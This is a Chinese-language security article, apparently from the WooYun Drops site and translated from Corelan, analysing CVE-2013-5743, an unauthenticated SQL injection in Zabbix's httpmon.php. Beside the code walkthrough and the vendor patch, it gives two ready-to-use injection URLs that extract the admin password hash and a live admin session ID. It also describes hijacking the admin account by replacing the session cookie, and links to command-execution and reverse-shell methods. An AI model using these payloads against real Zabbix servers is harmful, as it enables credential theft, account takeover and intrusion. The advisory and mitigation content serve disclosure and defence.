<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Zabbix SQL Injection/RCE – CVE-2013-5743</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/10/17 12:55" ui-time="" datetime="2013/10/17 12:55" class="published ng-binding ng-isolate-scope">2013/10/17 12:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:<a href="https://www.corelan.be/index.php/2013/10/04/zabbix-sql-injectionrce-cve-2013-5743/">https://www.corelan.be/index.php/2013/10/04/zabbix-sql-injectionrce-cve-2013-5743/</a></p><h2>0x00 背景</h2><hr><p>该漏洞于2013年9月11号提交，9月23号得到确认，10月2号发布补丁。</p><p>新出的0day，可以通过sql注入直接进入后台，并执行系统命令。</p><p>该漏洞已有metasploit利用模块，请使用Zabbix的公司注意及时打补丁。</p><h2>0x01 利用细节</h2><hr><p>该漏洞存在于httpmon.php脚本中，未登录用户也可访问。</p><p>这是由于Zabbix预先设定了一个guest用户，未登录用户都被设定为guest用户的访问权限。</p><p>如果guest用户被禁用，将不能访问httpmon.php脚本，利用该漏洞。</p><p>可以在管理员的管理面板中禁用guest用户。</p><p>从下图中可以看出来applications参数存在sql注入。</p><p><img alt="enter image description here" img-src="a30efbf8b72e10cc1231bdae40d0f18f1506ba2c.jpg"></p><p>查看源代码：</p><pre><code>#!php
foreach ($_REQUEST['applications'] as $application) { 
     add2favorites('web.httpmon.applications', $application); 
     }
</code></pre><p>进入了$application变量中，跟踪add2favorites函数：</p><pre><code>#!php
function add2favorites($favobj, $favid, $source = null) { 
     $favorites = get_favorites($favobj); 
     foreach ($favorites as $favorite) { 
          if ($favorite['source'] == $source &amp;&amp; $favorite['value'] == $favid) { 
          return true; 
          } 
     } 
     DBstart(); 
     $values = array( 
          'profileid' =&gt; get_dbid('profiles', 'profileid'), 
          'userid' =&gt; CWebUser::$data['userid'], 
          'idx' =&gt; zbx_dbstr($favobj), 
          'value_id' =&gt; $favid,
          'type' =&gt; PROFILE_TYPE_ID 
);
</code></pre><p>进入$values数组的value_id中，再往下跟踪就可以发现变量没有经过任何过滤进入到sql语句中：</p><pre><code>#!php
return DBend(DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')'));
</code></pre><p>最新，Zabbix的补丁：</p><pre><code>#!php
Index: frontends/php/include/profiles.inc.php
===================================================================
--- frontends/php/include/profiles.inc.php  (revision 38884)
+++ frontends/php/include/profiles.inc.php  (working copy)
@@ -148,9 +148,9 @@
            'profileid' =&gt; get_dbid('profiles', 'profileid'),
            'userid' =&gt; self::$userDetails['userid'],
            'idx' =&gt; zbx_dbstr($idx),
-           $value_type =&gt; ($value_type == 'value_str') ? zbx_dbstr($value) : $value,
-           'type' =&gt; $type,
-           'idx2' =&gt; $idx2
+           $value_type =&gt; zbx_dbstr($value),
+           'type' =&gt; zbx_dbstr($type),
+           'idx2' =&gt; zbx_dbstr($idx2)
        );
        return DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')');// string value prepearing

if (isset($DB['TYPE']) &amp;&amp; $DB['TYPE'] == ZBX_DB_MYSQL) {
    function zbx_dbstr($var) {
        if (is_array($var)) {
            foreach ($var as $vnum =&gt; $value) {
                $var[$vnum] = "'".mysql_real_escape_string($value)."'";
            }
            return $var;
        }
        return "'".mysql_real_escape_string($var)."'";
    }
</code></pre><p>变量处理经过了一层mysql&#95;real&#95;escape_string函数的过滤。</p><p>在上面那个漏洞中，下面的语句可以读取管理员的用户名与密码md5的hash值：</p><pre><code>http://zabbix.server/zabbix/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28alias,0x7e,passwd,0x7e%29%20as%20char%29,0x7e%29%29%20from%20zabbix.users%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29
</code></pre><p><img alt="enter image description here" img-src="1b66b17489b92d9fed90614f4160e28f2ed4e042.jpg"></p><p>成功获取，但是如果管理员的密码过于复杂，md5碰撞不出来明文的怎么办呢？</p><p>发现Zabbix的数据库中还保存了用户的session值，它们似乎都不会失效，除非用户点击了退出登录。</p><p>下图展示了数据库中sessions表保存的内容：</p><p><img alt="enter image description here" img-src="d37d37a97477e1c7dab9c47141e32ca006d441f2.jpg"></p><p>那我们直接注入获取管理员的session值，直接登录吧，无需碰撞md5的hash了。</p><pre><code>http://zabbix.server/zabbix/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28sessionid,0x7e,userid,0x7e,status%29%20as%20char%29,0x7e%29%29%20from%20zabbix.sessions%20where%20status=0%20and%20userid=1%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29
</code></pre><p><img alt="enter image description here" img-src="5e69a386efec1e3a819e236776254de64d2d6daa.jpg"></p><p>用获取到的session替换cookie中zbx_sessionid中的值：</p><p><img alt="enter image description here" img-src="ede4ce6c2c317905612b7e69651c22cd1fedac9f.jpg"></p><p>然后就登陆成功：</p><p><img alt="enter image description here" img-src="b2a6e23b52369b3d89fc4c5c5def9eb95057b299.jpg"></p><p>管理员进入后可以命令执行具体方法wooyun上已经有了：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-023089">WooYun: sohu的zabbix,可导致内网渗透</a></p><p>也可以直接反弹shell执行命令方便很多，具体姿势可以参考：</p><p><a href="http://zone.wooyun.org/content/5064">反弹shell的十种姿势</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/3197" rel="bookmark" id="re1">Drupal - pre Auth SQL Injection Vulnerability</a></li><li><a href="http://drops.wooyun.org/tips/4322" rel="bookmark" id="re2">False SQL Injection and Advanced Blind SQL Injection</a></li><li><a href="http://drops.wooyun.org/papers/61" rel="bookmark" id="re3">分析下难得一见的ROR的RCE（CVE－2013－0156）</a></li><li><a href="http://drops.wooyun.org/papers/1018" rel="bookmark" id="re4">Shell Injection &amp; Command Injection</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-31 00:15:39</span></div><p></p><p>相当牛X</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaogui</span> <span class="reply-time">2013-10-19 14:39:15</span></div><p></p><p>长姿势了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">erevus</span> <span class="reply-time">2013-10-18 09:31:57</span></div><p></p><p>想当初某牛叫我挖这个程序的洞 我觉得太难 木有去看 后悔中</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">墨水心_Len</span> <span class="reply-time">2013-10-17 17:50:36</span></div><p></p><p>先占一板凳儿，晚上看</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刺刺</span> <span class="reply-time">2013-10-17 16:17:17</span></div><p></p><p>相当牛X！<br>我等菜菜，只能搜索一下wooyun以往的zabbix案例，复制张贴一番……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-10-17 14:17:00</span></div><p></p><p>跟老外几乎同步啊 给力</p><p></p></div></div></div></div></div></main>